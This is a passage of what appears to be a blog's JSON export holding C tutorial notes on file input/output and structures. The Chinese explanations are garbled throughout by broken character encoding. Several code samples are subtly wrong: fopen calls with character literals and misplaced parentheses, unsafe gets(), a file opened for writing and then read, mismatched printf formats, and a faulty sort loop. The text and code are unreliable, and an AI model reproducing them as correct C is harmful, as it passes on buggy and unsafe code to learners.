è¾“å‡ºæˆåŠŸ,è¿”å›å€¼å°±æ˜¯è¾“å‡ºçš„å­—ç¬¦,è¾“å‡ºå¤±è´¥,åˆ™è¿”å›æ–‡ä»¶ç»“æŸæ ‡å¿—EOF(å³-1) ä»é”®ç›˜è¾“å…¥ä¸€äº›å­—ç¬¦,å¹¶é€ä¸ªæŠŠå®ƒä»¬é€åˆ°ç£ç›˜ä¸Šå»,ç›´åˆ°ç”¨æˆ·è¾“å…¥ä¸€ä¸ªâ€#â€ä¸ºæ­¢.#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { FILE *fp; char ch, filename[10]; printf(&quot;è¯·è¾“å…¥æ‰€ç”¨çš„æ–‡ä»¶å:&quot;); scanf(&quot;%s&quot;, filename); getchar();//ç”¨æ¥æ¶ˆåŒ–æœ€åè¾“å…¥çš„å›è½¦ç¬¦ if ((fp = fopen(filename, &#39;w&#39;) == NULL)) { printf(&quot;cannot open file\\n&quot;); exit(0);//ç»ˆæ­¢ç¨‹åº } printf(&quot;è¯·è¾“å…¥ä¸€ä¸ªå‡†å¤‡å­˜å‚¨åˆ°ç£ç›˜çš„å­—ç¬¦ä¸²(ä»¥#ç»“æŸ):&quot;); ch = getchar(); while (ch != &#39;#&#39;) { fputc(ch, fp); putchar(ch); ch = getchar(); //å†æ¥æ”¶ä»é”®ç›˜è¾“å…¥çš„ä¸€ä¸ªå­—ç¬¦ } fclose(fp); putchar(10); //å‘å±å¹•è¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦s return 0; } å°†ä¸€ä¸ªç£ç›˜æ–‡ä»¶ä¸­çš„ä¿¡æ¯å¤åˆ¶åˆ°å¦ä¸€ä¸ªç£ç›˜æ–‡ä»¶ä¸­#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { FILE *in, *out; char ch, infile[10], outfile[10]; printf(&quot;è¾“å…¥è¯»å…¥æ–‡ä»¶çš„åå­—:&quot;); scanf(&quot;%s&quot;, infile); printf(&quot;è¾“å…¥è¾“å‡ºæ–‡ä»¶çš„åå­—:&quot;); scanf(&quot;%s&quot;, outfile); getchar(); //ç”¨æ¥æ¶ˆåŒ–æœ€åè¾“å…¥çš„å›è½¦ç¬¦ if ((in = fopen(infile, &#39;r&#39;) == NULL)) { printf(&quot;cannot open file\\n&quot;); exit(0); } if ((out = fopen(outfile, &#39;w&#39;) == NULL)) { printf(&quot;cannot open file\\n&quot;); exit(0); } ch = fgetc(in); while (!feof(in)) //å¦‚æœªé‡åˆ°è¾“å…¥æ–‡ä»¶çš„ç»“æŸæ ‡å¿— { fputc(ch, out); putchar(ch); //æ˜¾ç¤ºåœ¨å±å¹•ä¸Š ch = fgetc(in); } putchar(10); //æ˜¾ç¤ºå®Œå…¨éƒ¨å­—ç¬¦åæ¢è¡Œ fclose(in); fclose(out); return 0; } åœ¨è®¿é—®ç£ç›˜æ–‡ä»¶æ—¶,æ˜¯é€ä¸ªå­—ç¬¦(å­—èŠ‚)è¿›è¡Œçš„,ä¸ºäº†çŸ¥é“å½“å‰è®¿é—®åˆ°ç¬¬å‡ ä¸ªå­—èŠ‚,ç³»ç»Ÿç”¨â€æ–‡ä»¶è¯»å†™ä½ç½®æ ‡è®°â€æ¥è¡¨ç¤ºå½“å‰æ‰€è®¿é—®çš„ä½ç½®.å¼€å§‹æ—¶æŒ‡å‘ç¬¬1ä¸ªå­—èŠ‚,æ¯è®¿é—®å®Œä¸€ä¸ªå­—èŠ‚,å½“å‰è¯»å†™ä½ç½®å°±æŒ‡å‘ä¸‹ä¸€ä¸ªå­—èŠ‚.ä¸ºäº†çŸ¥é“å¯¹æ–‡ä»¶çš„è¯»å†™æ˜¯å¦å®Œæˆ,åªéœ€çœ‹æ–‡ä»¶è¯»å†™ä½ç½®æ˜¯å¦ç§»åˆ°æ–‡ä»¶çš„æœ«å°¾. feofå‡½æ•°å¯ä»¥æ£€æµ‹æ–‡ä»¶æ˜¯å¦å·²è¢«è¯»å–è¿‡. æ€æ ·å‘æ–‡ä»¶è¯»å†™ä¸€ä¸ªå­—ç¬¦ä¸²fgets(str,n,fp); ä½œç”¨æ˜¯ä»fpæ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å…¥ä¸€ä¸ªé•¿åº¦ä¸ºn-1çš„å­—ç¬¦ä¸²,å¹¶åœ¨æœ€ååŠ ä¸€ä¸ªâ€™\\0â€™å­—ç¬¦,ç„¶åæŠŠè¿™nä¸ªå­—ç¬¦å­˜æ”¾åˆ°å­—ç¬¦æ•°ç»„strä¸­. è¯»å†™ä¸€ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•° å‡½æ•°å è°ƒç”¨å½¢å¼ åŠŸèƒ½ è¿”å›å€¼ fgets fgets(str,n,fp) ä»fpæŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªé•¿åº¦ä¸º(n-1)çš„å­—ç¬¦ä¸²,å­˜æ”¾åˆ°å­—ç¬¦æ•°ç»„strä¸­. è¯»æˆåŠŸ,è¿”å›åœ°å€str,å¤±è´¥åˆ™è¿”å›NULL fputs fputs(str,fp) æŠŠstræ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†™åˆ°æ–‡ä»¶æŒ‡é’ˆå˜é‡fpæ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­ è¾“å‡ºæˆåŠŸ,è¿”å›0;å¦åˆ™è¿”å›é0å€¼ fgetså‡½æ•°çš„åŸå‹ä¸ºï¼š char *fgets(char * str,int n,FILE *fp); ä½œç”¨æ˜¯ä»æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸².è°ƒç”¨æ—¶å¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼: fgets(str,n,fp) næ˜¯è¦æ±‚å¾—åˆ°çš„å­—ç¬¦ä¸ªæ•°,ä½†å®é™…ä¸Šåªä»fpæ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å…¥n-1å­—ç¬¦,ç„¶ååœ¨æœ€ååŠ ä¸€ä¸ªâ€™\\0â€™å­—ç¬¦,è¿™æ ·å¾—åˆ°çš„å­—ç¬¦ä¸²å…±æœ‰nä¸ªå­—ç¬¦,æŠŠå®ƒä»¬æ”¾åˆ°å­—ç¬¦æ•°ç»„strä¸­. å¦‚æœåœ¨è¯»å®Œn-1ä¸ªå­—ç¬¦ä¹‹å‰é‡åˆ°æ¢è¡Œç¬¦â€™\\nâ€™æˆ–æ–‡ä»¶ç»“æŸç¬¦EOF,è¯»å…¥å³ç»“æŸ,ä½†å°†æ‰€é‡åˆ°çš„æ¢è¡Œç¬¦â€\\nâ€ä¹Ÿä½œä¸ºä¸€ä¸ªå­—ç¬¦è¯»å…¥.æ‰§è¡ŒæˆåŠŸè¿”å›å€¼ä¸ºstræ•°ç»„é¦–å…ƒç´ çš„åœ°å€,å¦‚æœä¸€å¼€å§‹å°±é‡åˆ°æ–‡ä»¶å°¾æˆ–è¯»æ•°æ®å‡ºé”™,åˆ™ä¸ºNULL. fputså‡½æ•°çš„åŸå‹ä¸ºï¼š char *fputs(char * str,FILE *fp); å…¶ä½œç”¨æ˜¯å°†stræ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºåˆ°fpæ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­.è°ƒç”¨æ—¶å¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼: fputs(&quot;China&quot;,fp); ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯å­—ç¬¦ä¸²å¸¸é‡,å­—ç¬¦æ•°ç»„åæˆ–å­—ç¬¦å‹æŒ‡é’ˆ.å­—ç¬¦ä¸²æœ«å°¾çš„â€™\\0â€™ä¸è¾“å‡º.è¾“å‡ºæˆåŠŸ,å‡½æ•°å€¼ä¸º0,ä¸æˆåŠŸåˆ™ä¸ºEOF(-1). ä»é”®ç›˜è¯»å…¥è‹¥å¹²ä¸ªå­—ç¬¦ä¸²,å¯¹å®ƒä»¬æŒ‰å­—æ¯å¤§å°çš„é¡ºåºæ’åº,ç„¶åæŠŠæ’å¥½åºçš„å­—ç¬¦ä¸²é€åˆ°ç£ç›˜æ–‡ä»¶ä¸­ä¿å­˜.#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { FILE *fp; char str[3][10], temp[10]; int i, j, k, n = 3; printf(&quot;Enter strings:\\n&quot;); for (i = 0; i &lt; n; i++) gets(str[i]); for (i = 0; i &lt; n - 1; i++) //ç”¨é€‰æ‹©æ³•å¯¹å­—ç¬¦ä¸²æ’åº { k = i; for (j = i + 1; j &lt; n; j++) { if (strcmp(str[k], str[j]) &gt; 0) k = j; if (k != i) { strcpy(temp, str[i]); strcpy(str[i], str[k]); strcpy(str[k], temp); } } } if ((fp = fopen(&quot;D:\\\\CC\\\\string.dat&quot;, &quot;w&quot;)) == NULL) { printf(&quot;can&#39;t open file!\\n&quot;); exit(0); } printf(&quot;\\nThe new sequence:\\n&quot;); for (i = 0; i &lt; n; i++) { fputs(str[i], fp); fputs(&quot;\\n&quot;, fp); printf(&quot;%s&quot;, str[i]); } fclose(fp); return 0; } ç”¨æ ¼å¼åŒ–çš„æ–¹å¼è¯»å†™æ–‡æœ¬æ–‡ä»¶fprintf(æ–‡ä»¶æŒ‡é’ˆ,æ ¼å¼åŒ–å­—ç¬¦ä¸²,è¾“å‡ºè¡¨åˆ—); fscanf(æ–‡ä»¶æŒ‡é’ˆ,æ ¼å¼åŒ–å­—ç¬¦ä¸²,è¾“å…¥è¡¨åˆ—);//ä»ç£ç›˜æ–‡ä»¶ä¸Šè¯»å…¥ASCIIå­—ç¬¦ --- fprintf(fp,&quot;%d,%6.2f&quot;,i,f); å› ä¸ºåœ¨è¾“å…¥æ—¶è¦å°†æ–‡ä»¶ä¸­çš„ASCIIç è½¬æ¢ä¸ºäºŒè¿›åˆ¶å½¢å¼å†ä¿å­˜åœ¨å†…å­˜å˜é‡ä¸­,åœ¨è¾“å‡ºæ—¶åˆè¦å°†å†…å­˜ä¸­çš„äºŒè¿›åˆ¶å½¢å¼è½¬æ¢æˆå­—ç¬¦,è¦èŠ±è´¹æ›´å¤šçš„æ—¶é—´,å› æ­¤,åœ¨å†…å­˜ä¸ç£ç›˜äº¤æ¢æ•°æ®çš„æƒ…å†µä¸‹,æœ€å¥½ä¸ç”¨fprintfå’Œfscanfå‡½æ•°,è€Œç”¨freadå’Œfwriteå‡½æ•°. ç”¨äºŒè¿›åˆ¶æ–¹å¼å‘æ–‡ä»¶è¯»å†™ä¸€ç»„æ•°æ®å…è®¸ç”¨freadå‡½æ•°ä»æ–‡ä»¶è¯»ä¸€ä¸ªæ•°æ®å—,ç”¨fwriteå‡½æ•°å‘æ–‡ä»¶å†™ä¸€ä¸ªæ•°æ®å—.åœ¨è¯»å†™æ—¶ä»¥äºŒè¿›åˆ¶å½¢å¼è¿›è¡Œçš„.åœ¨å‘ç£ç›˜å†™æ•°æ®æ—¶,ç›´æ¥å°†å†…å­˜ä¸­çš„ä¸€ç»„æ•°æ®åŸå°ä¸åŠ¨,ä¸åŠ è½¬æ¢åœ°å¤åˆ¶åˆ°ç£ç›˜æ–‡ä»¶ä¸Š,è¯»å…¥æ—¶ä¹Ÿæ˜¯å°†ç£ç›˜æ–‡ä»¶ä¸­è‹¥å¹²å­—èŠ‚çš„å†…å®¹ä¸€æ‰¹è¯»å…¥å†…å­˜. fread(buffer,size,count,fp); fwrite(buffer,size,count,fp); buffer: fread:ç”¨æ¥å­˜æ”¾ä»æ–‡ä»¶è¯»å…¥çš„æ•°æ®çš„å­˜å‚¨åŒºçš„åœ°å€ fwrite:æŠŠæ­¤åœ°å€å¼€å§‹çš„å­˜å‚¨åŒºä¸­çš„æ•°æ®å‘æ–‡ä»¶è¾“å‡º(æŒ‡èµ·å§‹åœ°å€) sizeï¼šè¦è¯»çš„æ¯ä¸ªæ•°æ®å—çš„å­—èŠ‚æ•°countï¼šè¦è¯»çš„æ•°æ®å—çš„ä¸ªæ•°fpï¼šæ–‡ä»¶æŒ‡é’ˆ å¦‚: fread(f,4,10,fp); //fæ˜¯ä¸€ä¸ªfloatå‹æ•°ç»„å(ä»£è¡¨æ•°ç»„é¦–å…ƒç´ åœ°å€),ä»fpæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥10ä¸ª4ä¸ªå­—èŠ‚çš„æ•°æ®,å­˜å‚¨åˆ°æ•°ç»„fä¸­ freadæˆ–fwriteæ‰§è¡ŒæˆåŠŸè¿”å›count(è¾“å…¥æˆ–è¾“å‡ºæ•°æ®é¡¹çš„ä¸ªæ•°). ä»é”®ç›˜è¾“å…¥10ä¸ªå­¦ç”Ÿçš„æœ‰å…³æ•°æ®,ç„¶åæŠŠå®ƒä»¬è½¬å­˜åˆ°ç£ç›˜æ–‡ä»¶ä¸Š.#include &lt;stdio.h&gt; #define SIZE 10 struct Student_type { char name[10]; int num; int age; char addr[15]; } stu[SIZE]; void save() { int i; FILE *fp; if ((fp = fopen(&quot;D:\\\\CC\\\\string.dat&quot;, &quot;wb&quot;)) == NULL)//äºŒè¿›åˆ¶æ–‡ä»¶ { printf(&quot;can&#39;t open file!\\n&quot;); exit(0); } for (i = 0; i &lt; SIZE; i++) if ((fwrite(&amp;stu[i], sizeof(struct Student_type), 1, fp) != 1)) printf(&quot;file write error!\\n&quot;); fclose(fp); } int main() { void save(); int i; printf(&quot;Enter datas of student:\\n&quot;); for (i = 0; i &lt; SIZE; i++) scanf(&quot;%s %d %d %s&quot;, stu[i].name, &amp;stu[i].num, &amp;stu[i].age, stu[i].addr); save(); return 0; } æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ æ•°æ®çš„å­˜å‚¨æ–¹å¼ â€‹ æ–‡æœ¬æ–¹å¼: æ•°æ®ä»¥å­—ç¬¦æ–¹å¼(ASCIIä»£ç )å­˜å‚¨åˆ°æ–‡ä»¶ä¸­.å¦‚æ•´æ•°12,é€åˆ°æ–‡ä»¶æ—¶å 2ä¸ªå­—èŠ‚,è€Œä¸æ˜¯4ä¸ªå­—èŠ‚.ä»¥æ–‡æœ¬æ–¹å¼ä¿å­˜çš„æ•°æ®ä¾¿äºé˜…è¯» â€‹ äºŒè¿›åˆ¶æ–¹å¼:æ•°æ®æŒ‰åœ¨å†…å­˜çš„å­˜å‚¨çŠ¶æ€åŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°æ–‡ä»¶.å¦‚æ•´æ•°12,é€åˆ°æ–‡ä»¶æ—¶å’Œå†…å­˜ä¸­ä¸€æ ·å 4ä¸ªå­—èŠ‚. æ–‡ä»¶çš„åˆ†ç±» â€‹ æ–‡æœ¬æ–‡ä»¶(ASCIIæ–‡ä»¶):æ–‡ä»¶å…¨éƒ¨ä¸ºASCIIå­—ç¬¦ â€‹ äºŒè¿›åˆ¶æ–‡ä»¶:æŒ‰äºŒè¿›åˆ¶æ–¹å¼æŠŠåœ¨å†…å­˜ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–‡ä»¶çš„,ç§°ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶,å³æ˜ åƒæ–‡ä»¶. æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ â€‹ æ–‡æœ¬æ–¹å¼: ä¸å¸¦bçš„æ–¹å¼,è¯»å†™æ–‡ä»¶æ—¶å¯¹æ¢è¡Œç¬¦è¿›è¡Œè½¬æ¢ â€‹ æ–‡æœ¬æ–¹å¼: å¸¦bçš„æ–¹å¼,è¯»å†™æ–‡ä»¶æ—¶å¯¹æ¢è¡Œç¬¦ä¸è¿›è¡Œè½¬æ¢ æ–‡ä»¶è¯»å†™å‡½æ•° â€‹ æ–‡æœ¬è¯»å†™å‡½æ•°:ç”¨æ¥å‘æ–‡æœ¬æ–‡ä»¶è¯»å†™å­—ç¬¦æ•°æ®çš„å‡½æ•°(å¦‚fgetc,fgets,fputc,fputs,fscanf,fprintfç­‰) â€‹ äºŒè¿›åˆ¶è¯»å†™å‡½æ•°:ç”¨æ¥å‘äºŒè¿›åˆ¶æ–‡ä»¶è¯»å†™äºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°(å¦‚getw,putw,fread,fwriteç­‰) éšæœºè¯»å†™æ•°æ®æ–‡ä»¶æ–‡ä»¶ä½ç½®æ ‡è®°åŠå…¶å®šä½æ–‡ä»¶ä½ç½®æ ‡è®°æ–‡ä»¶ä½ç½®æ ‡è®°ç”¨æ¥æŒ‡ç¤ºâ€æ¥ä¸‹æ¥è¦è¯»å†™çš„ä¸‹ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®â€ æ–‡ä»¶ä½ç½®æ ‡è®°çš„å®šä½:one: ç”¨rewindå‡½æ•°ä½¿æ–‡ä»¶ä½ç½®æ ‡è®°æŒ‡å‘å¼€å¤´.åŒæ—¶feofå‡½æ•°çš„å€¼ä¼šå›å¤ä¸º0(å‡). æœ‰ä¸€ä¸ªç£ç›˜æ–‡ä»¶,å†…æœ‰ä¸€äº›ä¿¡æ¯.è¦æ±‚ç¬¬1æ¬¡å°†å®ƒçš„å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Š,ç¬¬2æ¬¡æŠŠå®ƒå¤åˆ¶åˆ°å¦ä¸€æ–‡ä»¶ä¸Š.#include &lt;stdio.h&gt; int main() { FILE *fp1, *fp2; char ch; fp1 = fopen(&quot;file1.dat&quot;, &quot;r&quot;); //ä¸å«è·¯å¾„é»˜è®¤åœ¨æºæ–‡ä»¶æ‰€åœ¨ç›®å½• fp2 = fopen(&quot;file2.dat&quot;, &quot;w&quot;); ch = getc(fp1); while (!feof(fp1)) //æˆ–è€… while(ch!=EOF) { putchar(ch); ch = getc(fp1); } putchar(10); rewind(fp1); ch = getc(fp1); while (!feof(fp1)) { fputc(ch, fp2); ch = getc(fp1); } fclose(fp1); fclose(fp2); return 0; } :two:ç”¨fseekå‡½æ•°æ”¹å˜æ–‡ä»¶ä½ç½®æ ‡è®° fseek(æ–‡ä»¶ç±»å‹æŒ‡é’ˆ,ä½ç§»é‡,èµ·å§‹ç‚¹); èµ·å§‹ç‚¹: èµ·å§‹ç‚¹ åå­— ç”¨æ•°å­—ä»£è¡¨ æ–‡ä»¶å¼€å§‹ä½ç½® SEEK_SET 0 æ–‡ä»¶å½“å‰ä½ç½® SEEK_CUR 1 æ–‡ä»¶æœ«å°¾ä½ç½® SEEK_END 2 ä½ç§»é‡:ä»¥â€èµ·å§‹ç‚¹â€ä¸ºåŸºç‚¹,åº”æ˜¯longå‹æ•°æ®(åœ¨æ•°å­—çš„æœ«å°¾åŠ ä¸€ä¸ªå­—æ¯L,å°±è¡¨ç¤ºæ˜¯longå‹); fseek(fp,100L,0);//å°†æ–‡ä»¶ä½ç½®æ ‡è®°å…ˆå‰ç§»åˆ°ç¦»æ–‡ä»¶å¼€å¤´100ä¸ªå­—èŠ‚å¤„. :three:ç”¨ftellå‡½æ•°æµ‹å®šæ–‡ä»¶ä½ç½®æ ‡è®°çš„å½“å‰ä½ç½®. å‡½æ•°å¾—åˆ°æµå¼æ–‡ä»¶ä¸­æ–‡ä»¶ä½ç½®æ ‡è®°çš„å½“å‰ä½ç½®.è°ƒç”¨å‡½æ•°æ—¶å‡ºé”™(å¦‚ä¸å­˜åœ¨fpæŒ‡å‘çš„æ–‡ä»¶),è¿”å›å€¼ä¸º-1L. éšæœºè¯»å†™åœ¨ç£ç›˜æ–‡ä»¶ä¸Šå­˜æœ‰10ä¸ªå­¦ç”Ÿçš„æ•°æ®.è¦æ±‚å°†ç¬¬1,3,5,7,9ä¸ªå­¦ç”Ÿæ•°æ®è¾“å…¥è®¡ç®—æœº,å¹¶åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå‡ºæ¥.#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; struct Student_type { char name[10]; int num; int age; char addr[15]; } stu[10]; int main() { FILE *fp; int i; if ((fp = fopen(&quot;D:\\\\CC\\\\string.dat&quot;, &quot;wb&quot;)) == NULL) { printf(&quot;can&#39;t open file!\\n&quot;); exit(0); } for (i = 0; i &lt; 10; i += 2) { fseek(fp, i * sizeof(struct Student_type), 0); fread(&amp;stu[i], sizeof(struct Student_type), 1, fp); printf(&quot;%-10s %4d %4d %-15s\\n&quot;, stu[i].name, stu[i].num, stu[i].age, stu[i].addr); } fclose(fp); return 0; } æ–‡ä»¶è¯»å†™çš„å‡ºé”™æ£€æµ‹æ£€æŸ¥è¾“å…¥è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶å¯èƒ½å‡ºç°çš„é”™è¯¯. ferrorå‡½æ•° ferror(fp); å¦‚æœè¿”å›å€¼ä¸º0,è¡¨ç¤ºæœªå‡ºç°é”™è¯¯. å¦‚æœè¿”å›ä¸€ä¸ªéé›¶å€¼,è¡¨ç¤ºå‡ºé”™. å¯¹åŒä¸€ä¸ªæ–‡ä»¶æ¯ä¸€æ¬¡è°ƒç”¨è¾“å…¥è¾“å‡ºå‡½æ•°,éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ferrorå‡½æ•°å€¼.å› æ­¤åœ¨è°ƒç”¨ä¸€ä¸ªè¾“å…¥è¾“å‡ºå‡½æ•°åç«‹å³æ£€æŸ¥ferrorçš„å€¼,å¦åˆ™ä¿¡æ¯ä¼šä¸¢å¤±. åœ¨æ‰§è¡Œfopenå‡½æ•°æ—¶,ferrorå‡½æ•°çš„åˆå§‹å€¼è‡ªåŠ¨ç½®ä¸º0. clearerrå‡½æ•° ä½¿æ–‡ä»¶å‡ºé”™æ ‡è®°å’Œæ–‡ä»¶ç»“æŸæ ‡è®°ç½®ä¸º0.","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"users create data types themselves","slug":"9.users-create-data-types-themselves","date":"2020-10-25T09:18:07.000Z","updated":"2021-04-11T17:11:28.077Z","comments":true,"path":"9.users-create-data-types-themselves/","link":"","permalink":"https://blog.kayleh.top/9.users-create-data-types-themselves/","excerpt":"","text":"ç”¨æˆ·è‡ªå·±å»ºç«‹æ•°æ®ç±»å‹å®šä¹‰å’Œä½¿ç”¨ç»“æ„ä½“å˜é‡ç”±ä¸åŒç±»å‹æ•°æ®ç»„æˆçš„ç»„åˆå‹çš„æ•°æ®ç»“æ„ï¼Œå®ƒç§°ä¸ºç»“æ„ä½“. struct Student { int num; char name[20]; char sex; int age; float score; char addr[30]; }; å£°æ˜ç»“æ„ä½“ç±»å‹çš„ä¸€èˆ¬å½¢å¼ struct ç»“æ„ä½“å {æˆå‘˜è¡¨åˆ—}; ç»“æ„ä½“æˆå‘˜: ç±»å‹å æˆå‘˜å; æˆå‘˜å¯ä»¥å±äºå¦ä¸€ä¸ªç»“æ„ä½“ç±»å‹ struct Date{ int month; int day; int year; } struct Student { struct Date birthday; //æˆå‘˜birthdayå±äºstruct Dateç±»å‹ } å®šä¹‰ç»“æ„ä½“ç±»å‹å˜é‡å…ˆå£°æ˜ç»“æ„ä½“ç±»å‹,å†å®šä¹‰è¯¥ç±»å‹çš„å˜é‡.struct Student student1,student2; åœ¨å£°æ˜ç±»å‹çš„åŒæ—¶å®šä¹‰å˜é‡ struct Student { int num; char name[20]; char sex; int age; float score; char addr[30]; } student1, student2; struct ç»“æ„ä½“å { æˆå‘˜è¡¨åˆ— }å˜é‡åè¡¨åˆ—; ä¸æŒ‡å®šç±»å‹åè€Œç›´æ¥å®šä¹‰ç»“æ„ä½“ç±»å‹å˜é‡struct { æˆå‘˜è¡¨åˆ— }å˜é‡åè¡¨åˆ—; æ²¡æœ‰åå­—.æ˜¾ç„¶ä¸èƒ½å†ä»¥æ­¤ç»“æ„ç±»å‹å»å®šä¹‰å…¶ä»–å˜é‡. å¯¹ç±»å‹æ˜¯ä¸åˆ†é…ç©ºé—´çš„,åªå¯¹å˜é‡åˆ†é…ç©ºé—´ ç»“æ„ä½“ç±»å‹ä¸­çš„æˆå‘˜åå¯ä»¥ä¸ç¨‹åºä¸­çš„å˜é‡åç›¸åŒ,ä½†äºŒè€…ä¸ä»£è¡¨åŒä¸€å¯¹è±¡ ç»“æ„ä½“å˜é‡çš„åˆå§‹åŒ–å’Œå¼•ç”¨æŠŠä¸€ä¸ªå­¦ç”Ÿçš„ä¿¡æ¯(åŒ…æ‹¬å­¦å·,å§“åç­‰)æ”¾åœ¨ä¸€ä¸ªç»“æ„ä½“å˜é‡ä¸­,ç„¶åè¾“å‡ºè¿™ä¸ªå­¦ç”Ÿçš„ä¿¡æ¯. struct Student { int num; char name[20]; char sex; char addr[30]; } a = {10101, &quot;Li Lin&quot;, &#39;M&#39;, &quot;123 Beijing Road&quot;}; printf(&quot;No.:%ld\\nname:%s\\nsex:%c\\naddress:%s\\n&quot;, a.num, a.name, a.sex, a.addr); return 0; C99æ ‡å‡†å…è®¸å¯¹æŸä¸€æˆå‘˜b.name.å…¶ä»–æœªè¢«æŒ‡å®šåˆå§‹åŒ–çš„æ•°å€¼å‹æˆå‘˜è¢«ç³»ç»Ÿåˆå§‹åŒ–ä¸º0.å­—ç¬¦å‹æˆå‘˜è¢«ç³»ç»Ÿåˆå§‹åŒ–ä¸ºâ€™\\0â€™,æŒ‡é’ˆå‹æˆå‘˜è¢«ç³»ç»Ÿåˆå§‹åŒ–ä¸ºNULL å¼•ç”¨ç»“æ„ä½“å˜é‡ä¸­æˆå‘˜çš„å€¼,å¼•ç”¨æ–¹å¼ä¸º ç»“æ„ä½“å˜é‡å.æˆå‘˜å .æ˜¯æˆå‘˜è¿ç®—ç¬¦,åœ¨æ‰€æœ‰çš„è¿ç®—ç¬¦ä¸­ä¼˜å…ˆçº§æœ€é«˜. å¯ä»¥å¯¹å˜é‡çš„æˆå‘˜èµ‹å€¼. åŒç±»çš„ç»“æ„ä½“å˜é‡å¯ä»¥äº’ç›¸èµ‹å€¼ student1=student2; è¾“å…¥ä¸¤ä¸ªå­¦ç”Ÿçš„å­¦å·,å§“åå’Œæˆç»©è¾ƒé«˜çš„å­¦ç”Ÿçš„å­¦å·,å§“åå’Œæˆç»©.#include &lt;stdio.h&gt; int main() { struct Student { int num; char name[20]; float score; } student1, student2; printf(&quot;please enter student1 num,name,score:\\n&quot;); scanf(&quot;%d%s%f&quot;, &amp;student1.num, student1.name, &amp;student1.score); printf(&quot;please enter student2 num,name,score:\\n&quot;); scanf(&quot;%d%s%f&quot;, &amp;student2.num, student2.name, &amp;student2.score); if (student1.score &gt; student2.score) printf(&quot;No.:%ld\\nname:%s\\nscore:%c\\n&quot;, student1.num, student1.name, student1.score); else if (student1.score &lt; student2.score) printf(&quot;No.:%ld\\nname:%s\\nscore:%c\\n&quot;, student2.num, student2.name, student2.score); else { printf(&quot;No.:%ld\\nname:%s\\nscore:%c\\n&quot;, student1.num, student1.name, student1.score); printf(&quot;No.:%ld\\nname:%s\\nscore:%c\\n&quot;, student2.num, student2.name, student2.score); } return 0; } ä½¿ç”¨ç»“æ„ä½“æ•°ç»„å®šä¹‰ç»“æ„ä½“æ•°ç»„#include &lt;stdio.h&gt; #include &lt;string.h&gt; struct Person { char name[20]; int count; } leader[3] = {&quot;Li&quot;, 0, &quot;Zhang&quot;, 0, &quot;Sun&quot;, 0}; int main() { int i, j; for (i = 0; i &lt; 10; i++) { char leader_name[20]; scanf(&quot;%s&quot;, leader_name); for (j = 0; j &lt; 3; j++) if (strcmp(leader_name, leader[j].name) == 0) leader[j].count++; } printf(&quot;\\nResult:\\n&quot;); for (i = 0; i &lt; 3; i++) printf(&quot;%5s:%d\\n&quot;, leader[i].name, leader[i].count); return 0; } å®šä¹‰ç»“æ„ä½“æ•°ç»„ä¸€èˆ¬å½¢å¼â‘  struct ç»“æ„ä½“å {æˆå‘˜è¡¨åˆ—} æ•°ç»„å[æ•°ç»„é•¿åº¦]; â‘¡å…ˆå£°æ˜ä¸€ä¸ªç»“æ„ä½“ç±»å‹(å¦‚struct Person),ç„¶åå†ç”¨æ­¤ç±»å‹å®šä¹‰ç»“æ„ä½“æ•°ç»„ ç»“æ„ä½“ç±»å‹ æ•°ç»„å[æ•°ç»„é•¿åº¦] å¦‚: struct Person leader; å¯¹ç»“æ„ä½“æ•°ç»„åˆå§‹åŒ–çš„å½¢å¼æ˜¯åœ¨å®šä¹‰æ•°ç»„çš„åé¢åŠ ä¸Š ={åˆå€¼è¡¨åˆ—}; å¦‚: struct Person leader[3] = {&quot;Li&quot;, 0, &quot;Zhang&quot;, 0, &quot;Sun&quot;, 0}; æœ‰nä¸ªå­¦ç”Ÿçš„ä¿¡æ¯(åŒ…æ‹¬å­¦å·,å§“å,æˆç»©),è¦æ±‚æŒ‰ç…§æˆç»©çš„é«˜ä½é¡ºåºè¾“å‡ºå„å­¦ç”Ÿçš„ä¿¡æ¯.#include &lt;stdio.h&gt; #include &lt;string.h&gt; struct Student { int num; char name[20]; float score; }; // æœ‰nä¸ªå­¦ç”Ÿçš„ä¿¡æ¯(åŒ…æ‹¬å­¦å·,å§“å,æˆç»©),è¦æ±‚æŒ‰ç…§æˆç»©çš„é«˜ä½é¡ºåºè¾“å‡ºå„å­¦ç”Ÿçš„ä¿¡æ¯. int main() { struct Student stu[5] = {{10101, \"Zhang\", 78}, {10103, \"Wang\", 98.5}, {10106, \"Li\", 86}, {10108, \"Ling\", 73.5}, {10110, \"Sun\", 100}}; int i, j, k; struct Student temp; const int n = 5; for (i = 0; i &lt; n - 1; i++) { k = i; for (j = i + 1; j &lt; n; j++) if (stu[j].score &gt; stu[k].score) k = j; temp = stu[k]; stu[k] = stu[i]; stu[i] = temp; } for (i = 0; i &lt; n; i++) 